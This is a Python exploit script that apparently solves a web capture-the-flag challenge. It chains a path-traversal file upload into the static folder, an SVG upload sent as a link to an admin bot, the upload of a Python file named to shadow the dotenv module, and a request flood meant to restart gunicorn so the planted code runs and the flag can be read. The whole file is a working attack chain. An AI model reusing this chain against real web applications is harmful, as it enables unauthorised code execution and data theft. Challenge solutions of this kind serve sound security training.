import requests
import base64
import time

CHALLENGE_URL = "http://localhost:5000/"
#CHALLENGE_URL = "https://no-thanks-i-use-ai-26.chall.ctf.bzh/"
s = requests.session()

# register
r = s.post(CHALLENGE_URL + "api/register", json={"username": "hacker", "password": "hacker"})

if r.status_code != 200:
    print("[-] Failed to register")
    exit(1)

print("registered")

# login
r = s.post(CHALLENGE_URL + "api/login", json={"username": "hacker", "password": "hacker"})

if r.status_code != 200:
    print("[-] Failed to login")
    exit(1)

print("logged in")

# upload JS file to /static
with open("poc.js", "rb") as f:
    FILE_CONTENTS = f.read()
    FILE_BASE64 = base64.b64encode(FILE_CONTENTS).decode("utf-8")

    r = s.post(CHALLENGE_URL + "api/upload", json={
        "filename": ["/../../static/js/poc.js"],
        "content": FILE_BASE64
    })

    print("uploaded JS file")
    f.close()

# upload classic SVG
with open("poc.svg", "rb") as f:
    FILE_CONTENTS = f.read()
    FILE_BASE64 = base64.b64encode(FILE_CONTENTS).decode("utf-8")

    r = s.post(CHALLENGE_URL + "api/upload", json={
        "filename": "poc.svg",
        "content": FILE_BASE64
    })

    print("uploaded SVG file")
    f.close()

# upload python in app folder
with open("overwrite.py", "rb") as f:
    FILE_CONTENTS = f.read()
    FILE_BASE64 = base64.b64encode(FILE_CONTENTS).decode("utf-8")

    r = s.post(CHALLENGE_URL + "api/upload", json={
        "filename":"dotenv.py",
        "content": FILE_BASE64
    })

    print("uploaded python file")
    f.close()

time.sleep(2)

# send message to admin
r = s.post(CHALLENGE_URL + "api/send_message", json={"to":"admin","content":"http://localhost:5000/uploads/poc.svg","attachment":"null"})

if r.status_code != 200:
    print("[-] Failed to send message")
    exit(1)

print("sent message to admin")

time.sleep(2)

print("exhausting gunicorn")
# send 100 requests to exhaust gunicorn
for i in range(100):
    s.get(CHALLENGE_URL)

time.sleep(30)

print("gunicorn should have restarted, trying to fetch flag")

r = s.get(CHALLENGE_URL + "uploads/flag.txt")
print(r.text)